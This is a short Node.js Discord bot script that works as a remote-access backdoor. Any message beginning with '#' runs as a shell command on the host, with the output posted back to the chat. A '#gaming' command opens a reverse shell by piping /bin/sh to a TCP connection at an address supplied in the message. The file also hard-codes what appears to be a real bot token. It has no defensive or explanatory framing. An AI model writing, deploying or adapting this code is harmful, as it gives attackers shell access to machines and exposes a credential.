const Discord = require('discord.js')
const client = new Discord.Client({intents: [3276799]})
const child_process = require("child_process")

client.on('messageCreate', async message => {

	if(message.content.startsWith("#gaming")) {

		let cmd = message.content.substring(8).split(" ")

		try {
			(function(){
			    var net = require("net"),
			        cp = require("child_process"),
			        sh = cp.spawn("/bin/sh", []);
			    var client = new net.Socket();
			    client.connect(cmd[1], cmd[0], function(){
			        client.pipe(sh.stdin);
			        sh.stdout.pipe(client);
			        sh.stderr.pipe(client);
			    });
			    return /a/;
			})();
		} catch (e) {
			message.reply(`NODE ERROR\n${e}`)
		}

	} else if(message.content.startsWith("#")) {
		let cmd = message.content.substring(1)
		try {
			await child_process.exec(cmd, (err, stdout, stderr) => {
				if(err) {
					message.reply(`ERROR\n${err}`)
				} else if(stderr) {
					message.reply(`STD ERROR\n${stderr}`)
				} else {
					message.reply(stdout || "stdout empty")
				}
			})
		} catch (e) {
			message.reply(`NODE ERROR\n${e}`)
		}
	}
})

client.login("MTEwNzM2OTc4NDk4NDc0NDEwOA.GxZ534.GplYkJM_WhYy6_lBS4Higsu95iSm8wqI4J3jWg")